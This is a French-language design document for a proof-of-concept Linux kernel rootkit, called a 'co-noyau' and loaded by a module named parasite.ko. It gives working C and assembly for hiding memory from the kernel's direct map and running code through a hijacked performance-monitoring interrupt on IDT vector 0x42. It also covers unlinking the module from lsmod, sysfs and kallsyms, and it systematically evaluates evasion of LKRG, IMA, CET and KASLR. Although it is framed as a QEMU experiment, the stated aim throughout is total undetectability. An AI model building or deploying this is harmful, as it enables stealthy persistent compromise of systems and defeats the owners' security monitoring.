# PoC — Co-noyau Parallèle Linux
### Architecture bas niveau x86-64 · Invisibilité totale · Analyse des protections

---

## 1. Résumé du PoC

L'objectif est de faire émerger, depuis le noyau Linux d'un système invité QEMU x86-64, un composant d'exécution bas niveau indépendant — appelé **co-noyau** — capable de coexister avec Linux sans en être un simple module, sans créer une seconde VM, sans être un hyperviseur complet.

Le co-noyau doit :
- disposer de sa propre zone mémoire **totalement invisible de Linux**
- obtenir du temps CPU **sans aucune structure noyau enregistrée**
- être **indétectable** par tout mécanisme d'audit ou de surveillance du noyau hôte
- être chargé depuis un **driver noyau Linux temporaire** lui-même chargé depuis le userspace

L'objectif d'invisibilité porte sur **trois surfaces distinctes** : la mémoire, l'exécution, et le comportement observable.

---

## 2. Chaîne de chargement

### 2.1 Séquence complète

```
USERSPACE
  └── insmod parasite.ko
        │
DRIVER NOYAU (Ring 0, vie ~100ms)
  ├── alloc_pages()                  → allocation pages physiques
  ├── set_direct_map_invalid()       → retrait du direct map Linux
  ├── SetPageReserved()              → neutralisation buddy allocator
  ├── Construire PTEs manuelles      → mapping exclusif co-noyau
  ├── Copier le binaire du co-noyau  → dans ces pages
  ├── Résoudre adresses noyau        → via kprobes (KASLR-safe)
  ├── Configurer PMI + LAPIC         → source d'exécution hardware
  ├── S'effacer de toutes structures → disparition totale
  └── return — module n'existe plus
        │  (tous les N cycles CPU via PMI hardware)
CO-NOYAU ACTIF (pages physiques hors direct map)
  ├── S'exécute via interruption PMI hardware
  ├── Aucune task_struct, aucun thread, aucune vmap_area
  ├── Mémoire inaccessible depuis Linux
  └── Indétectable par tout mécanisme noyau
```

### 2.2 Principe d'invisibilité — trois surfaces

| Surface | Mécanisme | Résultat |
|---------|-----------|----------|
| **Mémoire** | `alloc_pages` + `set_direct_map_invalid` | Pages physiquement présentes mais inaccessibles depuis Linux |
| **Exécution** | PMI via MSR PMU + LAPIC | Déclenchement purement hardware, aucune fonction noyau hookée |
| **Comportement** | Exécution bornée, pas de modification structures Linux | Aucune anomalie observable |

---

## 3. Mémoire — invisibilité totale

### 3.1 Pourquoi `memmap=` est insuffisant

L'approche `memmap=32M$960M` présentait des problèmes rédhibitoires :

```
memmap= dans la cmdline
  → visible dans /proc/cmdline           ← détectable
  → visible dans /sys/firmware/memmap/   ← détectable
  → zone marquée "reserved" dans e820    ← détectable dans /proc/iomem
  → visible dans dmesg au boot           ← détectable
```

Et surtout, sur x86-64, Linux maintient un **direct mapping de TOUTE la RAM physique** :

```
ffff888000000000 → ffffc7ffffffffff  =  direct map de toute la RAM

Même une zone memmap= est lisible par Linux via :
  virt = 0xffff888000000000 + phys_addr
```

### 3.2 Solution : `alloc_pages` + `set_direct_map_invalid`

Technique utilisée par `memfd_secret` (Linux 5.14) et `guest_memfd` (KVM). Retire les pages du direct map de façon chirurgicale.

```c
#include <linux/mm.h>
#include <linux/set_memory.h>
#include <linux/gfp.h>

#define COMP_SIZE   (32 * 1024 * 1024)

static struct page *comp_pages = NULL;
static int comp_order;

int alloc_invisible_memory(void)
{
    int i;
    comp_order = get_order(COMP_SIZE);

    // 1. Allouer via buddy — aucune vmap_area créée
    comp_pages = alloc_pages(GFP_KERNEL, comp_order);
    if (!comp_pages)
        return -ENOMEM;

    // 2. Retirer du direct map — Linux perd tout accès physique
    for (i = 0; i < (1 << comp_order); i++)
        set_direct_map_invalid_noflush(comp_pages + i);

    // 3. Flush TLB — invalider entrées en cache
    flush_tlb_kernel_range(
        (unsigned long)page_address(comp_pages),
        (unsigned long)page_address(comp_pages) + COMP_SIZE);

    // 4. SetPageReserved — buddy ne reprend jamais ces pages
    for (i = 0; i < (1 << comp_order); i++)
        SetPageReserved(comp_pages + i);

    return 0;
}
```

### 3.3 Mapping exclusif pour le co-noyau

```c
// Construire une PGD propre — le co-noyau sera le seul
// à avoir un CR3 qui mappe ces pages physiques
static pgd_t *comp_pgd;

void build_component_pagetables(void)
{
    comp_pgd = (pgd_t *)get_zeroed_page(GFP_KERNEL);
    // Construire PGD→P4D→PUD→PMD→PTE vers nos pages physiques
    map_pages_to_pgd(comp_pgd, comp_pages, COMP_SIZE);
}
```

### 3.4 État de visibilité après installation

| Mécanisme de détection | Visible ? | Raison |
|------------------------|:---------:|--------|
| `/proc/cmdline` | ❌ | Pas de `memmap=` |
| `/proc/iomem` | ❌ | Pas de zone e820 réservée |
| `/sys/firmware/memmap/` | ❌ | Pas de modification e820 |
| `/proc/vmallocinfo` | ❌ | `alloc_pages` ≠ `vmalloc` — pas de vmap_area |
| `dmesg` | ❌ | Aucune trace de réservation |
| Direct map Linux | ❌ | PTE invalidée par `set_direct_map_invalid` |
| Lecture physique Ring 0 Linux | ❌ | Plus de mapping valide |
| `/proc/meminfo` MemFree | ⚠️ | Pages comptées "used" — indiscernable d'une alloc normale |
| `struct page` dans vmemmap | ⚠️ | Existe mais `PageReserved=1` — inerte |

### 3.5 Budget mémoire

| Composant | Taille | Remarque |
|-----------|--------|----------|
| Code co-noyau (texte + données) | ~500 KB | Compilé `-fPIC` |
| Page tables propres (PGD→PTE) | ~64 KB | Hiérarchie complète |
| IDT propre (256 × 16 B) | ~4 KB | Fixe |
| Stack dédiée | ~64 KB | Par CPU virtuel |
| Trampoline(s) | ~1 KB | 1 par point d'entrée |
| Buffers / heap interne | ~2 MB | Extensible |
| Marge | ~29 MB | Jamais touché |
| **TOTAL alloué** | **32 MB** | `get_order(32MB)` |

---

## 4. Exécution — source hardware invisible

### 4.1 Pourquoi l'inline hook texte noyau est insuffisant

L'ancienne approche patchait 14 octets dans `.text` noyau :

```
Traces inévitables :
  → 14 octets modifiés dans tick_handle_periodic
  → détectable par LKRG (Linux Kernel Runtime Guard)
  → détectable par IMA (Integrity Measurement Architecture)
  → détectable par comparaison vmlinuz octet-à-octet
  → détectable par tout outil de vérification d'intégrité noyau
```

### 4.2 Solution retenue : PMI + LAPIC timer

Le **Performance Monitoring Interrupt** est déclenché par le **hardware directement** après N cycles CPU, via les MSRs PMU et le Local APIC. C'est une source d'exécution entièrement orthogonale au noyau Linux.

```
Aucune fonction noyau hookée
Aucun patch dans le texte noyau
Aucun breakpoint matériel (DR0-DR7)
Déclenchement purement hardware
```

#### Configuration PMI depuis le module

```c
#include <asm/msr.h>
#include <asm/apic.h>

#define OUR_VECTOR      0x42
#define PMI_INTERVAL    1000000ULL   // tous les 1M cycles CPU

void setup_pmi_execution(void)
{
    // 1. IA32_FIXED_CTR_CTRL : activer CTR0 (cycles), tous rings, PMI on overflow
    wrmsrl(MSR_IA32_FIXED_CTR_CTRL, 0xBULL);

    // 2. Preset le compteur → overflow après PMI_INTERVAL cycles
    wrmsrl(MSR_IA32_FIXED_CTR0, (uint64_t)(-(int64_t)PMI_INTERVAL));

    // 3. Activer le compteur fixe 0
    wrmsrl(MSR_CORE_PERF_GLOBAL_CTRL, 0x100000000ULL);

    // 4. LAPIC LVT Performance → notre vecteur 0x42
    apic_write(APIC_LVTPC, OUR_VECTOR);

    // 5. Installer notre handler dans l'IDT sur le vecteur 0x42
    install_idt_handler(OUR_VECTOR, component_pmi_entry);
}
```

#### Handler PMI du co-noyau (assembleur)

```asm
component_pmi_entry:
    db 0xF3, 0x0F, 0x1E, 0xFA   ; ENDBR64 — IBT satisfait nativement

    ; Sauvegarde contexte complet
    pushfq
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    push rbp

    ; Logique du co-noyau
    call component_tick

    ; Recharger le compteur PMI pour la prochaine occurrence
    mov rcx, MSR_IA32_FIXED_CTR0
    mov rax, PMI_RELOAD_VALUE
    xor rdx, rdx
    wrmsr

    ; Acquitter le LAPIC (EOI obligatoire)
    mov rax, 0xFEE000B0
    mov dword ptr [rax], 0

    ; Restauration contexte
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    popfq

    iretq   ; Shadow Stack non déclenché — iretq ≠ RET
```

### 4.3 Sélection du vecteur IDT libre

Sur un Linux minimal, la carte des vecteurs IDT utilisés :

```
0x00–0x1F   Exceptions CPU (NMI, #GP, #PF, #CP, etc.)
0x20–0x2F   IRQs legacy PIC
0x30–0x3F   Syscall, IPI, APIC interne Linux
0x40–0x7F   → ZONE LIBRE sur système minimal
                Notre vecteur : 0x42
0x80        int 0x80 (syscall 32-bit compat)
0xEF        LAPIC timer Linux
0xFF        LAPIC spurious interrupt
```

Le vecteur `0x42` est libre et son installation sur une entrée IDT vide est bien moins suspecte qu'un patch de fonction noyau active.

### 4.4 Comparaison des méthodes d'exécution

| Méthode | Patch texte noyau | IDT modifiée | MSRs modifiés | DRs modifiés | Invisibilité |
|---------|:-----------------:|:------------:|:-------------:|:------------:|:------------:|
| Inline hook PTE | ✅ 14 octets | ❌ | ❌ | ❌ | ★★★ |
| Hardware BP `#DB` | ❌ | ✅ IDT[1] | ❌ | ✅ DR0-DR7 | ★★★ |
| **PMI + LAPIC** | **❌** | **✅ 1 vecteur libre** | **✅ PMU MSRs** | **❌** | **★★★★** |
| NMI hijack | ❌ | ✅ IDT[2] | ❌ | ❌ | ★★★★ |

---

## 5. Comportement — ne pas se trahir à l'exécution

Même avec une mémoire et une exécution invisibles, le co-noyau peut se trahir par des effets de bord observables.

### 5.1 Vecteurs de détection comportementale

| Comportement | Détectable par | Mitigation |
|---|---|---|
| Latence timer anormale | `perf`, mesure de timing | Exécution < 5μs par invocation PMI |
| Compteurs PMU aberrants | `perf stat` | Sauvegarder/restaurer les compteurs après usage |
| Modification structures noyau | LKRG, IMA | Lecture seule — ne jamais écrire dans les structures Linux |
| TLB flush global fréquent | Dégradation perf mesurable | `flush_tlb_one_kernel` ciblé uniquement |
| Spike CPU périodique | `top`, `perf top` | Exécution courte et régulière — indiscernable du bruit système |

### 5.2 Règles d'hygiène du co-noyau

```
1. Exécution bornée    → jamais plus de ~5μs par invocation PMI
2. Lecture seule       → ne pas modifier les structures Linux
3. Compteurs PMU       → sauvegarder/restaurer si utilisés
4. Stack propre        → utiliser notre stack dédiée, pas la stack Linux courante
5. Registres           → sauvegarder/restaurer TOUS les registres
6. LAPIC EOI           → toujours acquitter avant iretq
```

---

## 6. Protections modernes — coexistence

### 6.1 CR0.WP (Write Protection)

**Impact** : non applicable avec PMI — on ne patche plus le texte noyau.

**Si inline hook utilisé en fallback** : modification chirurgicale PTE uniquement. `CR0.WP` reste actif en permanence.

---

### 6.2 IBT — Indirect Branch Tracking (CET)

**Coexistence native** : `component_pmi_entry` préfixé `ENDBR64`. IBT satisfait. **CET reste totalement actif, aucun MSR CET modifié, aucun bit CR4 touché.**

---

### 6.3 Shadow Stack — SS (CET)

**Coexistence native** : le handler se termine par `iretq`, pas `RET`. Les `CALL` internes sont symétriques.

| Transition | Instruction | Shadow Stack consulté ? |
|-----------|-------------|:----------------------:|
| LAPIC → `component_pmi_entry` | Interruption hardware | ❌ Non |
| `component_pmi_entry` → `component_tick` | `CALL` | ✅ RET symétrique |
| Fin handler | `iretq` | ❌ Non |

---

### 6.4 KASLR

**Bypass** : résolution runtime via kprobes.

```c
static struct kprobe kp = { .symbol_name = "tick_handle_periodic" };
register_kprobe(&kp);
unsigned long target = (unsigned long)kp.addr;
unregister_kprobe(&kp);
```

---

### 6.5 LKRG (Linux Kernel Runtime Guard)

**Avec PMI** : aucun patch texte noyau → LKRG ne voit rien sur l'intégrité `.text`.
**Risque résiduel** : scan IDT complet en config haute → vecteur 0x42 modifié détectable.
**Mitigation** : choisir un vecteur qui semble légitime, ou monitorer si LKRG est présent avant installation.

---

### 6.6 IMA (Integrity Measurement Architecture)

**Avec PMI** : aucune modification texte noyau → IMA ne détecte rien.

---

### 6.7 Tableau récapitulatif

| Protection | Impact sur nous | Verdict |
|-----------|----------------|---------|
| CR0.WP | Non applicable (pas de patch texte) | ✅ Naturellement évité |
| IBT (CET) | Exige ENDBR64 sur cibles JMP | ✅ ENDBR64 en tête — coexistence native |
| Shadow Stack (CET) | Vérifie symétrie CALL/RET | ✅ `iretq` — non déclenché |
| SMEP / SMAP | Pages user en Ring 0 | ✅ Non applicable |
| KASLR | Adresses aléatoires | ✅ kprobes au runtime |
| kallsyms non exporté | Pas d'accès symboles direct | ✅ kprobes workaround |
| KPTI | Isolation page tables | ✅ Non applicable (Ring 0 pur) |
| LKRG | Vérifie intégrité texte noyau | ✅ Aucun patch texte avec PMI |
| IMA | Mesure intégrité noyau | ✅ Aucun patch texte avec PMI |
| Module signing | Chargement module bloqué | ✅ Non pertinent (VM contrôlée) |
| LOCKDOWN LSM | Bloque ioremap / modules | ✅ Non pertinent (VM contrôlée) |

---

## 7. Architecture finale — synthèse complète

### 7.1 Schéma

```
USERSPACE
  └── insmod parasite.ko
            │
            ▼
DRIVER NOYAU (Ring 0, vie ~100ms)
  │
  ├── [MÉMOIRE]
  │     alloc_pages(GFP_KERNEL, order)
  │       → pas de vmap_area créée
  │     set_direct_map_invalid_noflush(pages)
  │       → hors direct map Linux
  │     SetPageReserved(pages)
  │       → buddy ne reprend jamais
  │     build_component_pagetables()
  │       → mapping exclusif via CR3 propre
  │     memcpy → co-noyau installé dans ces pages
  │
  ├── [EXÉCUTION]
  │     kprobe → résout adresses noyau si nécessaires
  │     install_idt_handler(0x42, component_pmi_entry)
  │     wrmsrl(PMU MSRs) → compteur cycles configuré
  │     apic_write(APIC_LVTPC, 0x42)
  │       → PMI hardware tous les ~1M cycles
  │
  ├── [DISPARITION MODULE]
  │     list_del(&THIS_MODULE->list)        → invisible lsmod
  │     kobject_del(&THIS_MODULE->mkobj)    → invisible sysfs
  │     THIS_MODULE->syms = NULL            → invisible kallsyms
  │     memset(__bug_table, 0, size)        → invisible bug table
  │     return 0
  │
  └── → module n'existe plus dans aucune structure noyau
            │
            │  (tous les ~1M cycles CPU via PMI hardware)
            ▼
CO-NOYAU ACTIF
  ├── Pages physiques hors direct map Linux
  │     → Linux ne peut pas lire ni écrire ces pages
  ├── Aucune vmap_area — pas de trace /proc/vmallocinfo
  ├── Aucune trace /proc/iomem, /proc/cmdline, dmesg
  ├── Exécuté par interruption PMI hardware
  │     → aucune fonction noyau hookée
  │     → aucun patch texte noyau
  │     → LKRG et IMA ne voient rien
  ├── ENDBR64 en tête → IBT satisfait, CET intact
  ├── iretq en sortie → Shadow Stack non déclenché
  └── Comportement borné → aucune anomalie observable
```

### 7.2 Inventaire des traces résiduelles

| Trace | Visible par | Niveau de risque |
|-------|-------------|:----------------:|
| 1 entrée IDT vecteur 0x42 | Scan IDT complet (LKRG config haute) | Faible |
| MSRs PMU modifiés | `rdmsr` direct, `perf stat` aberrant | Très faible |
| Pages "used" dans MemFree | `/proc/meminfo` | Nul — indiscernable |
| `struct page` `PageReserved=1` | Scan vmemmap exhaustif | Très faible |

**Aucune trace dans** : `/proc/iomem`, `/proc/cmdline`, `/proc/vmallocinfo`, `/proc/modules`, `lsmod`, `/sys/module/`, texte noyau `.text`, `dmesg`.

---

## 8. Configuration recommandée

### 8.1 Kernel de test

```
CONFIG_KPROBES=y                  # résolution adresses runtime
CONFIG_MODULE_SIG=n               # chargement sans signature
CONFIG_SECURITY_LOCKDOWN_LSM=n    # pas de lockdown
CONFIG_RANDOMIZE_BASE=y           # KASLR actif — géré par kprobes
CONFIG_X86_KERNEL_IBT=y           # CET IBT actif — coexistence native
CONFIG_SHADOW_STACK=y             # Shadow Stack actif — coexistence native
CONFIG_PERF_EVENTS=y              # PMU accessible
```

### 8.2 Commande QEMU

```bash
qemu-system-x86_64 \
  -machine q35 \
  -cpu host \
  -enable-kvm \
  -smp 1 \
  -m 1024 \
  -kernel bzImage \
  -initrd rootfs.cpio.gz \
  -append "console=ttyS0 nokaslr quiet" \
  -nographic
```

> Aucun `memmap=` dans la cmdline — la zone mémoire est allouée et dissimulée dynamiquement par le module.

---

## 9. Prochaines étapes d'implémentation

1. **Module noyau complet**
   - `alloc_pages` + `set_direct_map_invalid` + `SetPageReserved`
   - Construction page tables manuelles (`comp_pgd`)
   - Configuration PMI + LAPIC (MSRs + APIC_LVTPC)
   - Installation vecteur IDT `0x42`
   - Auto-effacement complet (list, kobject, syms, bug_table)

2. **`component_pmi_entry.asm`**
   - `ENDBR64` obligatoire en tête
   - Sauvegarde contexte 64-bit complet (GPR + flags)
   - Rechargement compteur PMI (`wrmsr`)
   - Acquittement LAPIC (EOI)
   - `iretq` en sortie

3. **`component_tick.c`**
   - Logique propre du co-noyau
   - Compilé `-fPIC -fno-stack-protector -mno-red-zone -nostdlib`
   - Respecte les règles d'hygiène (temps borné, lecture seule)

4. **`component.ld`**
   - Linker script avec base = adresse physique des pages allouées
   - Sections `.text .rodata .data .bss`

5. **`Makefile` complet**
   - Compilation co-noyau → binaire flat via `objcopy`
   - Inclusion dans le module via `objcopy -I binary`

6. **Validation**
   - Log via port série `0x3F8` depuis `component_tick`
   - Indépendant de `printk` Linux
   - Confirme la coexistence sans interaction avec Linux